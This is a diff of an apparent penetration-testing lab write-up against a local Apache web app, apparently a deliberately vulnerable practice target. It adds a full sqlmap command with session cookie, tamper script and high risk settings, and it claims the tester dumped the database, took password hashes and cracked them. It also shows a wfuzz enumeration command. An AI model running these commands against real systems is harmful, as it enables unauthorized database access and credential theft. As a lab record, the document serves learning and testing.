@@ -237,10 +237,10 @@ Run the scanner: Now that everything is set up, you can run the scanner with the
 **HTTP 80 (Apache http 2.4.41)**: You could look for web vulnerabilities. Run a tool like  Burp suite, dirbuster, sqlmap, to find potential vulnerabilities in the web application running on port 80. In addition, you can manually inspect the website for misconfigurations, insecure direct object references, SQL injection, etc.
 **Dirbuster**: This are my findings:
 
-**SQLMAP**: This are my findings sqlmap -u "http://192.168.1.250/?p=1&forumaction=search" --dbs
+**SQLMAP**: This are my findings sqlmap -u "http://10.0.0.175/simcorp/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=qc24358cjie3b9ero1tpt4nqus" --level=3 --risk=3 --random-agent --tamper=space2comment --time-sec=15 --delay=1 --dbs
 
-Ran Tamper set: sqlmap -u "http://10.0.0.175/?p=1&forumaction=search" '--tamper=space2comment' . This are the result
-**Result**:GET parameter 'forumaction' does not seem to be injectable
+Ran Tamper set: sqlmap -u "http://10.0.0.175/simcorp/sqli_1.php?title=" --cookie="security_level=0; PHPSESSID=qc24358cjie3b9ero1tpt4nqus" --level=3 --risk=3 --random-agent --tamper=space2comment --time-sec=15 --delay=1 --dbs. This are the result
+**Result**:GET parameter I was able to we full access to all the database, username, Hashes, and was able to crack the hashes and get there password as well, using the hash values.
 
 **WFUZZ** :Using this command, wfuzz -c -z file,/home/kali/Downloads/SecLists/Usernames/top-usernames-shortlist.txt --hc 404 http://10.0.0.175/FUZZ
 **Result**: I was not able to inject anything.
